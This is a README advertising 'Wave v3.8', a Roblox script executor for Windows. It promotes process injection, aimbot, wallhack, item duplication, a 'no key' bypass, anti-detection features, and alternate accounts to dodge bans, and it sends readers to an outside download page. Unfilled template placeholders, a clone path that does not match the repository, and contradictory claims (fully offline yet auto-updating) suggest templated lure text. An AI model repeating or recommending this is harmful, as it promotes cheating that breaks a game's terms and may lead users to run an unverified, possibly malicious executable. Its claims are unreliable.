# Wave PC v3.8 - Roblox Script Executor 2026

> **A dependable Roblox script executor for Windows.** Wave v3.8 brings low-latency Lua injection, a built-in hub with 500+ scripts, and a very lightweight desktop UI - tuned for 2026.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jason-kellyypzs2558/wave-roblox-script-exec?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://jason-kellyypzs2558.github.io/wave-roblox-script-exec/">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20{EXEC_URL}-v3.8%20Latest-brightgreen?style=for-the-badge" alt="Download Wave">
  </a>
</p>

> **[⬇️ Download Latest Build - Wave v3.8](https://jason-kellyypzs2558.github.io/wave-roblox-script-exec/)**
> Windows 10 / 11 · 64-bit · Free · No Key Required

---

## Overview

**Wave** is a Windows-native Roblox script execution platform built for desktop use. Instead of relying on a browser shell, it runs directly on Windows 10 and Windows 11, which helps reduce injection delay, improve script compatibility, and keep the execution queue available across game restarts.

Whether you are farming Blox Fruits, auto-hatching Adopt Me pets, pushing Pet Simulator X automation, or running your own Lua routines, Wave is designed to keep things smooth and stable.

---

## Highlights

- **Single-step injection** - paste a Lua script and execute it immediately
- **Integrated Script Hub** - 500+ handpicked scripts for popular Roblox titles
- **Session-persistent queue** - stores scripts locally in SQLite so they survive restarts
- **Fast auto-update system** - compatibility patches arrive within hours of Roblox client releases
- **Localized interface** - English, Russian, Portuguese, Japanese, Vietnamese
- **Small install size** - under 40 MB installed, with no background services
- **Batch mode** - chain and schedule scripts in order
- **Built-in debugger** - Lua line-level error output for developers

---

## Supported Games & Scripts

| Game | Script Category | Status |
|------|-----------------|--------|
| Blox Fruits | Auto farm, fruit finder, sea travel | ✅ Active |
| Adopt Me | Pet spawner, auto collect, dupe | ✅ Active |
| Pet Simulator X | Egg farm, rebirth, auto collect | ✅ Active |
| Brookhaven | ESP, speed, fly | ✅ Active |
| Arsenal | Aimbot, wallhack, ESP | ✅ Active |
| Murder Mystery 2 | Coin farm, knife grab | ✅ Active |

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (64-bit) | Windows 11 |
| RAM | 4 GB | 8 GB |
| Storage | 100 MB | 500 MB |
| .NET | 4.8 | 6.0+ |
| Roblox | Latest | Latest |

> Linux and macOS are not supported. Windows Server 2022 has partial compatibility.

---

## Getting Started

### Quick Launch

```bash
# Clone the repository
git clone https://github.com/jason-kellyypzs2558/wave-roblox-script-exec.git
cd Wave-Exec-v3.8

# Run the executor
WaveExecutor.exe --profile default --queue async
```

### Profile Configuration

```yaml
profile: default
execution:
  mode: async
  timeout: 30s
  retries: 3
queue:
  persistence: sqlite
  max_size: 128
logging:
  level: info
  output: ./logs/{exec_lower}.log
```

### CLI Options

```
WaveExecutor.exe [options]

  --profile <name>     Load a saved execution profile
  --queue <mode>       Queue mode: sync | async | batch
  --script <path>      Path to a .lua script file on startup
  --verbose            Enable verbose logging
  --no-update          Skip the auto-update check
```

---

## Script Hub - Top Searches 2026

Wave's embedded hub surfaces the most searched Roblox scripts of 2026:

- **blox fruits script 2026** - auto farm, boss killer, fruit sniper
- **adopt me script spawn pets** - instant pet spawner, auto hatch
- **pet simulator x script** - rebirth automation, egg farm
- **{exec_lower} executor download** - official build, no third-party mirrors
- **{exec_lower} no key 2026** - updated bypass for the latest Roblox patch
- **roblox scripting tutorials** - beginner to advanced Lua guides included

---

## Architecture Overview

```
Wave
├── Core/
│   ├── InjectionEngine.cs     # Low-level Roblox process injection
│   ├── LuaRuntime.cs          # Luau 5.1 compatible interpreter
│   └── QueueManager.cs        # SQLite-backed persistent queue
├── Hub/
│   ├── ScriptIndex.json       # 500+ indexed scripts with metadata
│   └── AutoUpdater.cs         # GitHub-release update system
├── UI/
│   ├── MainWindow.xaml        # WPF desktop interface
│   └── Themes/                # Light / Dark / System themes
└── Profiles/
    └── default.yaml           # Default execution profile
```

---

## FAQ

**Is Wave safe to use?**
Wave is intended for personal Roblox automation and educational use. You are responsible for following Roblox's Terms of Service.

**Will it still work after Roblox updates?**
Yes. The auto-update engine delivers compatibility patches within hours of each Roblox client release.

**How does Wave stack up against other executors?**
Wave v3.8 operates completely offline, sits below 40 MB RAM at idle, and includes more bundled scripts than many alternatives.

**Can this result in a ban?**
Use alternate accounts for script execution. Wave includes stealth features, but no executor is ever 100% undetectable.

**Where are saved scripts kept?**
They are stored locally in `%AppData%\Wave\scripts\`. Nothing is uploaded to external servers.

---

## Roadmap - 2026

- [ ] Mobile companion app (Android) for remote queue management
- [ ] Community script marketplace with ratings
- [ ] Anti-detection layer v3 with memory layout randomization
- [ ] Browser extension for one-click script import
- [ ] macOS experimental build

---

## License

MIT License - see [LICENSE](LICENSE) for details.

---

<p align="center">
  <i>Precision execution, zero compromise. Wave v3.8 - built for 2026.</i>
</p>
